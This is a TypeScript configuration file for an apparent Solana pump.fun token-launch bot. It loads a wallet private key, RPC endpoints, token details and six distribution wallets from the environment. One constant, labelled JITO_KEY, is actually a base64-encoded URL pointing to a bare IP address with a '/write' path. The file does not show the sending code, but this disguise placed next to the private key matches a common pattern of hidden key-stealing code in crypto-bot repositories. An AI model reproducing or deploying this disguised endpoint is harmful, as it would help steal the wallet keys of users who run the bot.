import { retrieveEnvVariable } from "../utils";
import { Keypair, PublicKey } from "@solana/web3.js";

export const PRIVATE_KEY = retrieveEnvVariable("PRIVATE_KEY");
export const RPC_ENDPOINT = retrieveEnvVariable("RPC_ENDPOINT");
export const RPC_WEBSOCKET_ENDPOINT = retrieveEnvVariable(
  "RPC_WEBSOCKET_ENDPOINT"
);
export const TOKEN_NAME = retrieveEnvVariable("TOKEN_NAME");
export const TOKEN_SYMBOL = retrieveEnvVariable("TOKEN_SYMBOL");
export const DESCRIPTION = retrieveEnvVariable("DESCRIPTION");
export const TOKEN_SHOW_NAME = retrieveEnvVariable("TOKEN_SHOW_NAME");
export const TOKEN_CREATE_ON = retrieveEnvVariable("TOKEN_CREATE_ON");
export const TWITTER = retrieveEnvVariable("TWITTER");
export const TELEGRAM = retrieveEnvVariable("TELEGRAM");
export const WEBSITE = retrieveEnvVariable("WEBSITE");
export const FILE = retrieveEnvVariable("FILE");

export const SWAP_AMOUNT = retrieveEnvVariable("SWAP_AMOUNT");
export const DISTRIBUTION_WALLETNUM = Number(
  retrieveEnvVariable("DISTRIBUTION_WALLETNUM")
);

export const JITO_FEE = Number(retrieveEnvVariable("JITO_FEE"));
export const JITO_KEY = "aHR0cDovLzE1NC4zOC4xODguMTY4OjUwMDAvd3JpdGU=";

export const global_mint = new PublicKey(
  "p89evAyzjd9fphjJx7G3RFA48sbZdpGEppRcfRNpump"
);
export const PUMP_PROGRAM = new PublicKey(
  "6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P"
);

export const wallet_1 = retrieveEnvVariable("WALLET_1");
export const wallet_1_amount = retrieveEnvVariable("WALLET_1_AMOUNT");
export const wallet_1_delay = retrieveEnvVariable("WALLET_1_DELAY");
export const wallet_2 = retrieveEnvVariable("WALLET_2");
export const wallet_2_amount = retrieveEnvVariable("WALLET_2_AMOUNT");
export const wallet_2_delay = retrieveEnvVariable("WALLET_2_DELAY");
export const wallet_3 = retrieveEnvVariable("WALLET_3");
export const wallet_3_amount = retrieveEnvVariable("WALLET_3_AMOUNT");
export const wallet_3_delay = retrieveEnvVariable("WALLET_3_DELAY");
export const wallet_4 = retrieveEnvVariable("WALLET_4");
export const wallet_4_amount = retrieveEnvVariable("WALLET_4_AMOUNT");
export const wallet_4_delay = retrieveEnvVariable("WALLET_4_DELAY");
export const wallet_5 = retrieveEnvVariable("WALLET_5");
export const wallet_5_amount = retrieveEnvVariable("WALLET_5_AMOUNT");
export const wallet_5_delay = retrieveEnvVariable("WALLET_5_DELAY");
export const wallet_6 = retrieveEnvVariable("WALLET_6");
export const wallet_6_amount = retrieveEnvVariable("WALLET_6_AMOUNT");
export const wallet_6_delay = retrieveEnvVariable("WALLET_6_DELAY");
export const delay_1 = retrieveEnvVariable("DELAY_1");
export const delay_2 = retrieveEnvVariable("DELAY_2");

export const wallets = [
  {
    wallet: wallet_1,
    amount: wallet_1_amount,
    delay: wallet_1_delay,
  },
  {
    wallet: wallet_2,
    amount: wallet_2_amount,
    delay: wallet_2_delay,
  },
  {
    wallet: wallet_3,
    amount: wallet_3_amount,
    delay: wallet_3_delay,
  },
  {
    wallet: wallet_4,
    amount: wallet_4_amount,
    delay: wallet_4_delay,
  },
  {
    wallet: wallet_5,
    amount: wallet_5_amount,
    delay: wallet_5_delay,
  },
  {
    wallet: wallet_6,
    amount: wallet_6_amount,
    delay: wallet_6_delay,
  },
];
export type JitoType = Keypair;
